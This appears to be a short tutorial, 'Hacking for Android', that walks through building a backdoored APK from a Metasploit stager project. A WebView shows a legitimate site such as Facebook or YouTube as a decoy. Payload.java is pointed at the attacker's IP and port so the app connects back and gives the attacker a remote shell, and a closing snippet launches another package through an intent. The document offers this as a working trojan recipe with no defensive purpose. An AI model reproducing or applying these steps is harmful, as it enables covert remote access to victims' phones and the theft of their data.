# Hacking for Android

We need to add this code to the file: *hbox-android000011-ramixter* $\rightarrow$ *app* $\rightarrow$ *src* $\rightarrow$ *main* $\rightarrow$ *res* $\rightarrow$ *layout* $\rightarrow$ **activity_main.xml**

```xml
<WebView  
    android:id="@+id/webview"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" />
```

We need to add this code to the file: *hbox-android000011-ramixter* $\rightarrow$ *app* $\rightarrow$ *src* $\rightarrow$ *main* $\rightarrow$ *java* $\rightarrow$ *stage* $\rightarrow$ *metasploit* $\rightarrow$ *com* $\rightarrow$ *backdoredapk* $\rightarrow$ **MainActivity.java**:

```java
import android.webkit.WebView;
```

```java
setContentView(R.layout.activity_main);
        WebView webView = (WebView) findViewById(R.id.webview);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadUrl("<MY_LINK>");
```

and we will have to replace <MY_LINK> with the link we want to which the application redirects us, for example: https://www.facebook.com/, https://www.youtube.com/, https://www.google.com/, etc.

We need to change this line in the file: *hbox-android000011-ramixter* $\rightarrow$ *app* $\rightarrow$ *src* $\rightarrow$ *main* $\rightarrow$ *java* $\rightarrow$ *stage* $\rightarrow$ *metasploit* $\rightarrow$ *com* $\rightarrow$ *backdoredapk* $\rightarrow$ **Payload.java**:

```java
public static final String URL = "ZZZZtcp://<MY_IP>:<PORT>"
```

> this line refers to our attacking machine, for example Kali or Linux, where `<MY_IP>` will be the ip address of my attacking machine. And `<PORT>` will be the port that we have configured.

**Once the changes are finished we will proceed to compile the APK again.**

# APK Easy Tool

```java
Intent launchIntent = getPackageManger().getLaunchIntentForPackage("<MY_PACKAGE>");startActivity(launchIntent);
```
